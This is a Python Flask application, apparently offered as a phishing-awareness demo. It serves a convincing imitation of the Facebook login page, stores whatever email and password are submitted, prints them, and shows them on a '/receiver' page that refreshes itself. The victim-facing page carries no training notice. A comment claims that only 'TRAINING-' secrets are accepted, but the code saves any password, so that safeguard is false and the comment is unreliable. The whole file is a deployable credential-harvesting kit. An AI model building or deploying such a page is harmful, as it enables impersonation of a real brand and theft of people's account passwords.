from flask import Flask, request, render_template_string
import sqlite3
import os

app = Flask(__name__)

DB_FILE = "training_demo.db"


# ==========================================
# Database
# ==========================================

def init_db():
    conn = sqlite3.connect(DB_FILE)

    conn.execute("""
        CREATE TABLE IF NOT EXISTS demo_data (
            id INTEGER PRIMARY KEY,
            username TEXT,
            training_secret TEXT
        )
    """)

    conn.commit()
    conn.close()


def save_demo_data(username, secret):
    conn = sqlite3.connect(DB_FILE)

    conn.execute("DELETE FROM demo_data")

    conn.execute(
        """
        INSERT INTO demo_data
        (username, training_secret)
        VALUES (?, ?)
        """,
        (username, secret)
    )

    conn.commit()
    conn.close()


def get_demo_data():
    conn = sqlite3.connect(DB_FILE)

    result = conn.execute(
        """
        SELECT username, training_secret
        FROM demo_data
        ORDER BY id DESC
        LIMIT 1
        """
    ).fetchone()

    conn.close()

    if result:
        return result[0], result[1]

    return "لا يوجد", "لا يوجد Training Secret"


# ==========================================
# Student 1 Page
# ==========================================

student_page = """
<!DOCTYPE html>

<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>SocialBook - Training Demo</title>

    <style>

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, Helvetica, sans-serif;
        }

        body {
            background: #f0f2f5;
            min-height: 100vh;

            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            width: 100%;
            max-width: 1000px;

            display: flex;
            align-items: center;
            justify-content: space-between;

            padding: 30px;
            gap: 50px;
        }

        .left {
            width: 55%;
        }

        .logo {
            color: #1877f2;
            font-size: 58px;
            font-weight: bold;
            margin-bottom: 15px;
        }

        .description {
            font-size: 28px;
            line-height: 1.3;
            color: #1c1e21;
        }

        .login-box {
            width: 380px;

            background: white;

            padding: 18px;

            border-radius: 8px;

            box-shadow:
                0 2px 10px rgba(0, 0, 0, 0.15);

            text-align: center;
        }

        input {
            width: 100%;

            padding: 15px;

            margin-bottom: 12px;

            border:
                1px solid #dddfe2;

            border-radius: 6px;

            font-size: 16px;

            outline: none;
        }

        input:focus {
            border-color: #1877f2;
        }

        .login-btn {
            width: 100%;

            padding: 14px;

            background: #1877f2;

            color: white;

            border: none;

            border-radius: 6px;

            font-size: 20px;

            font-weight: bold;

            cursor: pointer;
        }

        .login-btn:hover {
            background: #166fe5;
        }

        .forgot {
            display: block;

            margin: 16px 0;

            color: #1877f2;

            text-decoration: none;

            font-size: 14px;
        }

        .line {
            border-top:
                1px solid #dadde1;

            margin: 20px 0;
        }

        .create-btn {
            background: #42b72a;

            color: white;

            border: none;

            padding: 13px 20px;

            border-radius: 6px;

            font-size: 17px;

            font-weight: bold;

            cursor: pointer;
        }

        .create-btn:hover {
            background: #36a420;
        }

        .note {
            margin-top: 25px;

            font-size: 12px;

            color: #65676b;

            line-height: 1.5;
        }

        .training-label {
            display: block;

            text-align: left;

            font-size: 13px;

            font-weight: bold;

            color: #555;

            margin-bottom: 6px;
        }

        .warning {
            background: #fff3cd;

            color: #856404;

            padding: 10px;

            margin-bottom: 15px;

            border-radius: 6px;

            font-size: 13px;

            line-height: 1.4;
        }

        @media (max-width: 700px) {

            .container {
                flex-direction: column;

                text-align: center;

                gap: 30px;
            }

            .left {
                width: 100%;
            }

            .logo {
                font-size: 48px;
            }

            .description {
                font-size: 21px;
            }

            .login-box {
                width: 100%;

                max-width: 380px;
            }
        }

    </style>

</head>


<body>

    <div class="container">


        <!-- Left Side -->

        <div class="left">

            <div class="logo">
                Facebook
            </div>

            <p class="description">

                Connect with friends and
                the world around you
                on this social network.

            </p>

        </div>


        <!-- Login / Training Box -->

        <div class="login-box">

        


            <form
                method="POST"
                action="/"
            >

                <input
                    type="text"
                    name="username"
                    placeholder="Email or Phone Number"
                    autocomplete="on"
                    required
                >


                <label class="training-label">

                    Password 

                </label>


                <input
                    type="password"
                    name="secret"
                    placeholder="Password"
                    autocomplete="off"
                    required
                >


                <button
                    class="login-btn"
                    type="submit"
                >

                    Submit 

                </button>

            </form>


            <a
                href="#"
                class="forgot"
            >

                Forgotten password?

            </a>


            <div class="line"></div>


            <button
                class="create-btn"
                type="button"
            >

                Create New Account

            </button>


            <p class="note">

                This page is protected by Facebook 
            </p>

        </div>

    </div>

</body>

</html>
"""


# ==========================================
# Student 1
# ==========================================

@app.route("/", methods=["GET", "POST"])
def student():

    if request.method == "POST":

        username = request.form.get(
            "username",
            ""
        ).strip()

        secret = request.form.get(
            "secret",
            ""
        ).strip()


        # السماح فقط ببيانات التدريب

        if secret:

            save_demo_data(
                username,
                secret
            )


            print("\n" + "=" * 60)

            print(
                "🚨 PHISHING AWARENESS DEMONSTRATION"
            )

            print("=" * 60)

            print(
                f"👤 Training Username: {username}"
            )

            print(
                f"🔐 Training Secret: {secret}"
            )

            print("=" * 60)

            print(
                "⚠️ Training Secret فقط"
            )

            print("=" * 60 + "\n")


        else:

            print("\n" + "=" * 60)

            print(
                "⚠️ تم رفض الإدخال."
            )

            print(
                "استخدم Training Secret يبدأ بـ TRAINING-"
            )

            print("=" * 60 + "\n")


    return render_template_string(
        student_page
    )


# ==========================================
# Student 2 / Receiver Page
# ==========================================

receiver_page = """
<!DOCTYPE html>

<html lang="ar" dir="rtl">

<head>

<meta charset="UTF-8">

<meta
    http-equiv="refresh"
    content="2"
>

<meta
    name="viewport"
    content="width=device-width, initial-scale=1.0"
>

<title>Training Receiver</title>


<style>

body {

    font-family: Arial;

    background: #111;

    color: white;

    text-align: center;

    padding-top: 70px;

}


.box {

    width: 500px;

    max-width: 90%;

    margin: auto;

    padding: 40px;

    background: #222;

    border-radius: 20px;

    box-shadow:
        0 5px 25px
        rgba(0, 0, 0, 0.4);

}


.data {

    background: white;

    color: #111;

    padding: 20px;

    margin: 15px 0;

    font-size: 24px;

    border-radius: 10px;

    font-weight: bold;

    word-break: break-word;

}


.secret {

    color: red;

}


.warning {

    color: orange;

    margin-top: 30px;

    line-height: 1.6;

}


.status {

    background: #333;

    padding: 12px;

    border-radius: 8px;

    margin-top: 20px;

    font-size: 14px;

}

</style>

</head>


<body>


<div class="box">


<h1>

    📡 Receiver

</h1>


<h2>

    البيانات التدريبية المستلمة

</h2>


<p>

    👤 Training Username:

</p>


<div class="data">

    {{ username }}

</div>


<p>

    🔐 Training Secret:

</p>


<div class="data secret">

    {{ secret }}

</div>


<div class="status">

    🔄 يتم تحديث البيانات تلقائياً

</div>


<p class="warning">

    ⚠️ هذا نظام توعوي فقط.<br>

    لا تستخدم كلمات مرور حقيقية.

</p>


</div>


</body>

</html>
"""


# ==========================================
# Receiver
# ==========================================

@app.route("/receiver")
def receiver():

    username, secret = get_demo_data()


    return render_template_string(

        receiver_page,

        username=username,

        secret=secret

    )


# ==========================================
# Start Application
# ==========================================

init_db()


if __name__ == "__main__":

    port = int(
        os.environ.get(
            "PORT",
            5000
        )
    )


    app.run(

        host="0.0.0.0",

        port=port

    )
